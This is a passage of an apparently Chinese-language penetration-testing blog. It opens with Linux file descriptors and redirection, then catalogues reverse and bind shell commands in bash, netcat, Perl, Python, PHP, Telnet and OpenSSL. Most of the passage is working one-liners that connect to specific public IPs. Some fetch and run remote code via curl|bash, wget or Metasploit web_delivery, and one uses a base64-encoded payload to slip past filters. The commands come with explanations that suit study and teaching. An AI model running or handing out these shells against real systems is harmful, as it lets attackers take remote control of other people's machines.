class="comment">#即表示在分配自己的文件描述符，以后如果用`8&gt;`输出，就表示输出到自己的test文件了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用自己定义的文件描述符</span></span><br><span class="line">&amp;+数字（也就是用&amp;+文件描述符）</span><br><span class="line">如   &amp;8</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜ ~ ➜  exec 5&gt; test   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">数字+&gt;+文件对象，，，，即表示在分配自己的文件描述符，以后如果用5&gt;输出的就表示输出到自己的<span class="built_in">test</span>文件了</span></span><br><span class="line">➜ ~ ➜  echo &#x27;are you ok?&#x27; 1&gt;&amp;5</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">把文件描述符5指向<span class="built_in">test</span>文件，然后把当前输出重定向到文件描述符5</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用&amp;引用文件描述符，即找到文件描述符指向的目标文件</span></span><br><span class="line">➜ ~ ➜  cat test</span><br><span class="line">are you ok?</span><br></pre></td></tr></table></figure><h2 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a><code>/dev/null</code></h2><p>特殊文件，写入的任何东西都会被清空。</p><p>用法：</p><ol><li>把标准错误输出重定向到&#x2F;dev&#x2F;null，从而丢掉不想保存的错误信息</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ol start="2"><li>快速移除文件中的数据而不用删除文件</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><blockquote><p>重定向是把输出定向到<strong>文件</strong>或者<strong>标准流</strong>。重定向输入输出本质上就是<strong>重定向文件描述符</strong>。</p></blockquote><ol><li>输入重定向</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;`                    ——————从文件读取输入</span><br></pre></td></tr></table></figure><ol start="2"><li>输出重定向：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;            ——————将输出保存到文件。</span><br><span class="line">&gt;&gt;         ——————将输出追加到文件。</span><br></pre></td></tr></table></figure><ol start="3"><li>管道</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|                ——————将一个程序的输出作为输入发送到另一个程序。</span><br></pre></td></tr></table></figure><h1 id="反弹shell的本质"><a href="#反弹shell的本质" class="headerlink" title="反弹shell的本质"></a>反弹shell的本质</h1><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>被控端主动发起连接请求去连接控制端（这是反向shell），通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。（这是正向shell的毛病）</p><p>再比如说一个常见例子：我们可以从内网访问外网的机器，但是无法从外网的机器访问内网。</p><p>所有我们需要反向shell也就是反弹shell，从被控端请求连接控制端，获取反弹shell</p><h3 id="被控端："><a href="#被控端：" class="headerlink" title="被控端："></a>被控端：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><strong>被控端</strong>命令参数解释：</p><ul><li><p><code>bash -i</code>：打开一个交互式的<code>bash shell</code>。（常见的<code>shell</code>还有<code>zsh</code>）</p></li><li><p>&#x2F;dev目录（只在bash下面才会有）：</p></li></ul><blockquote><p>&#x2F;dev&#x2F;tcp是Linux bash中的一个特殊设备（设备即文件），打开这个文件就相当于发起了一个<strong>socket调用</strong>，建立一个socket连接，读写这个文件就相当于在这个<strong>socket连接</strong>中传输数据。这个东西看不到但是可以用</p><p><code>/dev/tcp/10.10.1.11/6666</code>的作用便是和<code>10.10.1.11</code>的<code>6666</code>端口建立TCP连接，相当于搭建起来一个管道，通过给出不同参数可以发送或者接受数据</p></blockquote><ul><li><code>0&gt;&amp;1</code>：</li></ul><blockquote><p><code>0&gt;</code>表示由 <code>/dev/tcp/10.10.1.11/6666</code> 传递的数据作为交互式<code>shell</code>的输入，即从另一个机器发送来的数据，当作输入，输入的是标准的显示屏 即<code>&amp;1</code>指向的设备，此时被<code>shell</code>使用，即相当于接受远程发送来的命令，输出到被控机器的屏幕上被执行</p></blockquote><ul><li><code>bash -i &gt;&amp; /dev/tcp/10.10.1.11/6666</code>：</li></ul><blockquote><p><code>&gt;&amp;</code>、<code>&amp;&gt;</code> ：表示混合输出（正确、错误的输出都输出到一个地方）</p><p>所以该部分命令的意思是：bash命令执行后的结果通过管道输出到 <code>/dev/tcp/10.10.1.11/6666</code> 。    </p></blockquote><ul><li>实际上这个语句就是一个循环</li></ul><blockquote><ul><li>输出：<code>bash -i &gt;&amp; /dev/tcp/10.10.1.11/6666</code></li><li>输入：<code>/dev/tcp/10.10.1.11/6666 0&gt;&amp;1</code></li><li>这个命令就是一个输入输出集合到一起，输入输出的一个反复执行</li></ul></blockquote><h3 id="控制端："><a href="#控制端：" class="headerlink" title="控制端："></a>控制端：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc –lvvp 6666</span><br><span class="line"><span class="comment">#监听6666端口</span></span><br></pre></td></tr></table></figure><h2 id="实现控制端和被控端之间的交互（多种形式）"><a href="#实现控制端和被控端之间的交互（多种形式）" class="headerlink" title="实现控制端和被控端之间的交互（多种形式）"></a>实现控制端和被控端之间的交互（多种形式）</h2><blockquote><p>目的是，控制端输入，输入被传送到被控端执行，执行后将输出返回传送到控制端，显示出来</p></blockquote><h3 id="把被控端的交互式shell输出重定向到控制端："><a href="#把被控端的交互式shell输出重定向到控制端：" class="headerlink" title="把被控端的交互式shell输出重定向到控制端："></a>把被控端的交互式shell输出重定向到控制端：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/10.10.1.11/6666</span><br></pre></td></tr></table></figure><blockquote><p><code>bash -i</code>交互式终端执行后的而结果，返回到控制端。(<code>&gt;</code>重定向输出到控制端）</p><p>实际上是bash -i 1&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.1.11&#x2F;6666，但是省略了1，因为标准输出可以省略</p></blockquote><h3 id="把控制端的输入重定向到被控端的交互式shell："><a href="#把控制端的输入重定向到被控端的交互式shell：" class="headerlink" title="把控制端的输入重定向到被控端的交互式shell："></a>把控制端的输入重定向到被控端的交互式shell：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/10.10.1.11/6666</span><br></pre></td></tr></table></figure><h3 id="结合两条语句"><a href="#结合两条语句" class="headerlink" title="结合两条语句"></a>结合两条语句</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1      </span><br></pre></td></tr></table></figure><blockquote><p>由 <code>/dev/tcp/10.10.1.11/6666</code> 传递的数据作为交互式<code>shell</code>的输入，命令执行后的结果输出到 <code>/dev/tcp/10.10.1.11/6666</code> 。</p><p>另外需要注意嗷，现在只显示正确的输出，error是不输出的！！</p></blockquote><h3 id="再添上错误输出，形成最终的反弹shell的命令"><a href="#再添上错误输出，形成最终的反弹shell的命令" class="headerlink" title="再添上错误输出，形成最终的反弹shell的命令"></a>再添上错误输出，形成最终的反弹shell的命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -i &amp;&gt; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1     </span><br><span class="line">bash -i &gt; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><blockquote><p><code>\&gt;&amp;、&amp;&gt;</code> ：混合输出（正确、错误的输出都输出到一个地方）</p></blockquote><h1 id="不同方法反弹shell的命令"><a href="#不同方法反弹shell的命令" class="headerlink" title="不同方法反弹shell的命令"></a>不同方法反弹shell的命令</h1><h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><p>nc命令用于设置路由器，是网络工具中的瑞士军刀<br>nc命令全称<code>netcat</code>，用于设置路由器。它能通过 TCP 和 UDP 在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用 netcat 命令所能完成的事情令人惊讶。</p><p>命令详解：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ...</span><br><span class="line">listen <span class="keyword">for</span> inbound:     nc -l -p port [options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">    -G num          source-routing pointer: 4, 8, 12, ...</span><br><span class="line">        -l 使用监听模式，管控传入的资料。</span><br><span class="line">        -L              listen harder, re-listen on socket close </span><br><span class="line">        -n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">        -o&lt;输出文件&gt; 指定文件名称，把往来传输的流量数据以16进制字码倾倒成该文件保存。</span><br><span class="line">        -p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span><br><span class="line">        -u 使用UDP传输协议。</span><br><span class="line">        -v 显示指令执行过程。更详细的信息。两次-v会有更多详细信息</span><br><span class="line">        -e 绑定某个程序，使用端口</span><br><span class="line">        -e prog         inbound program to <span class="built_in">exec</span> [dangerous!!]</span><br><span class="line">        -d              detach from console, background mode       </span><br><span class="line">        -h              this cruft</span><br><span class="line">        -i secs         delay interval <span class="keyword">for</span> lines sent, ports scanned          </span><br><span class="line">        -r              randomize <span class="built_in">local</span> and remote ports</span><br><span class="line">        -s addr         <span class="built_in">local</span> <span class="built_in">source</span> address</span><br><span class="line">        -t              answer TELNET negotiation</span><br><span class="line">        -w secs         <span class="built_in">timeout</span> <span class="keyword">for</span> connects and final net reads</span><br></pre></td></tr></table></figure><h3 id="NC正向Shell"><a href="#NC正向Shell" class="headerlink" title="NC正向Shell"></a>NC正向Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端：</span></span><br><span class="line">nc -lvvp 6666 -e /bin/sh</span><br><span class="line"><span class="comment">#也可以/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc 10.10.1.7 6666</span><br><span class="line"><span class="comment">#原  理：</span></span><br><span class="line"><span class="comment">#被控端使用nc将/bin/sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell</span></span><br></pre></td></tr></table></figure><h3 id="NC反向Shell"><a href="#NC反向Shell" class="headerlink" title="NC反向Shell"></a>NC反向Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line"><span class="comment">#被控端：</span></span><br><span class="line">nc -e /bin/sh 10.10.1.11 6666</span><br><span class="line"><span class="comment">#原理：</span></span><br><span class="line"><span class="comment">#被控端使用nc将/bin/sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211142153547.png" alt="image-20221114215316237" style="zoom:33%;" /><h3 id="无-e-参数反弹shell"><a href="#无-e-参数反弹shell" class="headerlink" title="无 -e 参数反弹shell"></a>无 <code>-e</code> 参数反弹shell</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 139.155.49.43 6666 &gt;/tmp/f</span><br><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li><p><code>mkfifo</code> 命令首先创建了一个管道，<code>cat</code> 将管道里面的内容输出传递给<code>/bin/sh</code>，<code>sh</code>会执行管道里的命令并将标准输出和标准错误输出结果通过<code>nc</code> 传到该管道，由此形成了一个回路。</p></li><li><p><code>rm /tmp/f;mkfifo /tmp/f;</code>       如果有 <code>/tmp/f</code>同名管道文件就先删除之，再创建一个 <code>/tmp/f</code></p></li><li><p><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 139.155.49.43 6666 &gt;/tmp/f</code>  又是一个循环</p></li></ul><blockquote><ul><li><code>cat /tmp/f</code> 读取管道文件里的内容</li><li><code>2&gt;&amp;1</code>错误输出也重定向到标准输出</li><li><code>/bin/sh -i 2&gt;&amp;1 | nc 139.155.49.43 6666 &gt;/tmp/f</code> 前面执行的内容通过管道命令传输到后面进行执行，也就是前面bash的标准输出和错误输出都被<code>139.155.49.43 6666</code>接受并重定向输出到<code>/tmp/f</code> 文件</li></ul></blockquote><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line"><span class="built_in">mknod</span> backpipe p; nc 47.101.214.85 6666 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><blockquote><p>linux mkfifo命令：<a href="https://www.cnblogs.com/old-path-white-cloud/p/11685558.html">linux mkfifo命令基本用法 - 故道丶白云 - 博客园 (cnblogs.com)</a><br>Linux mknod 命令：创建字符设备文件和块设备文件</p></blockquote><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep <span class="string">&quot;netcat&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1</span><br><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc –lvvp 6666</span><br></pre></td></tr></table></figure><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端：</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/139.155.49.43/6666;<span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc –lvvp 6666</span><br><span class="line"><span class="comment">#base64编码绕过：</span></span><br><span class="line">bash -c <span class="string">&quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMjE0Ljg1LzY2NjYgMD4mMQ==|base64 -d|bash -i&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意使用了两次管道符，base64 -d表示对base64编码进行解码。之后交给bash -i处理</span></span><br></pre></td></tr></table></figure><p>解释：</p><ul><li><code>exec 5&lt;&gt;/dev/tcp/139.155.49.43/6666;</code>就是定义<u>文件描述符</u>和<u><code>/dev/tcp/139.155.49.43/6666</code></u>输入输出的重定向</li><li><code>cat &lt;&amp;5</code>  ：就是获取从文件描述符<code>5</code>对应的输入</li><li><code>|while read line</code> ：就是将前面的语句当作输入，<code>read line</code>就是将这个输入存储到<code>line</code>变量，<code>while</code>是表示循环</li><li><code>do &amp;line</code>  ：就是执行变量里面的命令</li><li><code>2&gt;&amp;5 &gt;&amp;5;</code>：就是将错误输出和标准输出重定向到文件描述符5对应的对象</li><li>实际上这个句子和前面的非常类似：<code>bash -i &gt;&amp; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1</code></li></ul><h4 id="为什么不直接执行反弹shell呢？而是base64加密再解密！"><a href="#为什么不直接执行反弹shell呢？而是base64加密再解密！" class="headerlink" title="为什么不直接执行反弹shell呢？而是base64加密再解密！"></a>为什么不直接执行反弹shell呢？而是base64加密再解密！</h4><p>因为linux反弹shell的命令有时候是会被一些特殊字符影响命令执行的结果。通过base64编码祛除特殊字符，再解码执行效果更好</p><h3 id="msf-1"><a href="#msf-1" class="headerlink" title="msf"></a>msf</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=10.10.1.11 lport=6666 -f raw</span><br><span class="line">msfvenom -l payloads | grep <span class="string">&quot;bash&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><h3 id="控制端"><a href="#控制端" class="headerlink" title="控制端"></a>控制端</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;47.101.214.85&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line">解释：（不懂语法没关系，懂意思就行）</span><br><span class="line">use socket类似python的import socket，导入模块</span><br><span class="line"><span class="variable">$i</span>和<span class="variable">$p</span>分别是指定ip和端口</span><br><span class="line">后面通过方法连接ip和端口</span><br><span class="line">open打开标准输入重定向到&amp;S，open打开标准输出也重定向到&amp;S，标准错误也是</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;47.101.214.85:6666&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="被控端"><a href="#被控端" class="headerlink" title="被控端"></a>被控端</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><h3 id="msf-2"><a href="#msf-2" class="headerlink" title="msf"></a>msf</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep <span class="string">&quot;perl&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h2><h3 id="vps"><a href="#vps" class="headerlink" title="vps"></a>vps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-0-2-ubuntu:~<span class="comment"># cat index.html</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/139.155.49.43/6666 0&gt;&amp;1</span><br><span class="line">root@VM-0-2-ubuntu:~<span class="comment"># python3 -m http.server</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">47.101.214.85 - - [03/Dec/2020 09:21:39] <span class="string">&quot;GET /1.sh HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><h3 id="target"><a href="#target" class="headerlink" title="target"></a>target</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl 139.155.49.43:8000|bash</span><br></pre></td></tr></table></figure><h3 id="result"><a href="#result" class="headerlink" title="result"></a>result</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@VM-0-2-ubuntu:~<span class="comment"># nc -lvvp 6666</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 6666)</span><br><span class="line">Connection from 47.101.214.85 46370 received!</span><br><span class="line">root@iZuf6j06q5f1lZ:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211142341912.png" alt="image-20221114234118391" style="zoom:50%;" /><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="Python一行命令反弹shell"><a href="#Python一行命令反弹shell" class="headerlink" title="Python一行命令反弹shell"></a>Python一行命令反弹shell</h3><h4 id="被控端-1"><a href="#被控端-1" class="headerlink" title="被控端"></a>被控端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.101.214.85&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="控制端-1"><a href="#控制端-1" class="headerlink" title="控制端"></a>控制端</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><h3 id="通过Msfvenom生成python反弹shell的payload"><a href="#通过Msfvenom生成python反弹shell的payload" class="headerlink" title="通过Msfvenom生成python反弹shell的payload"></a>通过Msfvenom生成python反弹shell的payload</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=6666 -f raw</span><br><span class="line"><span class="comment">#python执行刚刚msf生成的payload</span></span><br><span class="line">python -c <span class="string">&quot;刚刚生成的payload&quot;</span></span><br><span class="line"><span class="comment">#监听</span></span><br><span class="line">handler -p python/meterpreter/reverse_tcp -H 139.155.49.43 -P 6666</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150136312.png" alt="image-20221115013650972"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150136344.png" alt="image-20221115013657004"></p><h3 id="通过Web-delivery反弹shell："><a href="#通过Web-delivery反弹shell：" class="headerlink" title="通过Web delivery反弹shell："></a>通过Web delivery反弹shell：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target 0</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload </span><br><span class="line">python/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit –j</span><br><span class="line">python -c <span class="string">&quot;import sys;import ssl;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://139.155.49.43:8080/pWMAajktf&#x27;, context=ssl._create_unverified_context());exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150138041.png" alt="image-20221115013759636"></p><h3 id="msf-3"><a href="#msf-3" class="headerlink" title="msf"></a>msf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep <span class="string">&quot;python&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="PHP一行命令反弹shell"><a href="#PHP一行命令反弹shell" class="headerlink" title="PHP一行命令反弹shell"></a>PHP一行命令反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;47.101.214.85&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure><h3 id="Msfvenom生成php反弹shell脚本"><a href="#Msfvenom生成php反弹shell脚本" class="headerlink" title="Msfvenom生成php反弹shell脚本"></a>Msfvenom生成php反弹shell脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">攻击机生成payload</span></span><br><span class="line">msfvenom -p php/bind_php lport=6666 -f raw &gt; bind_php.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">攻击机起http服务</span></span><br><span class="line">python3 -m http.server</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">目标机器下载bind_php.php</span></span><br><span class="line">wget 124.223.217.243:8000/bind_php.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">攻击机msf设置选项，设置目标机器IP，端口，文件名，然后攻击机请求bind_php.php即可反弹shell</span></span><br><span class="line">如下图</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150143451.png" alt="image-20221115014313009" style="zoom:50%;" /><h3 id="通过web-delivery反弹shell："><a href="#通过web-delivery反弹shell：" class="headerlink" title="通过web_delivery反弹shell："></a>通过web_delivery反弹shell：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target 1</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload </span><br><span class="line">php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit –j</span><br><span class="line">php -d allow_url_fopen=<span class="literal">true</span> -r <span class="string">&quot;eval(file_get_contents(&#x27;http://139.155.49.43:8080/RRfKpX&#x27;, false, stream_context_create([&#x27;ssl&#x27;=&gt;[&#x27;verify_peer&#x27;=&gt;false,&#x27;verify_peer_name&#x27;=&gt;false]])));&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150145768.png" alt="image-20221115014503319"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget 139.155.49.43/s.php -O /tmp/s.php &amp;&amp; php /tmp/s.php</span><br></pre></td></tr></table></figure><h3 id="msf-4"><a href="#msf-4" class="headerlink" title="msf"></a>msf</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -l payload | grep <span class="string">&quot;php&quot;</span> | awk <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/bind_ruby lport=6666 -f raw</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150145712.png" alt="image-20221115014549291"></p><h3 id="msf-5"><a href="#msf-5" class="headerlink" title="msf"></a>msf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -l payload | grep <span class="string">&quot;ruby&quot;</span> | awk <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">nc -lvvp 5555</span><br><span class="line">nc -lvvp 6666</span><br><span class="line">目标机： </span><br><span class="line">telnet 47.101.214.85 5555 | /bin/bash | telnet 47.101.214.85 6666</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150146160.png" alt="image-20221115014633739" style="zoom:50%;" /><p>目标机执行</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150146595.png" alt="image-20221115014651270" style="zoom:50%;" /><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150147055.png" alt="image-20221115014709720" style="zoom:50%;" /><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">目标机：</span><br><span class="line"><span class="built_in">rm</span> -f a &amp;&amp; <span class="built_in">mknod</span> a p &amp;&amp; telnet 47.101.214.85 6666 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line"><span class="built_in">rm</span> -f a;<span class="built_in">mknod</span> a p;telnet 47.101.214.85 6666 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150147940.png" alt="image-20221115014731562"></p><h2 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h2><p>openssl反弹443端口，流量加密传输</p><ol><li>在远程攻击主机上生成秘钥文件</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><ol start="2"><li>在远程攻击主机上启动监视器</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 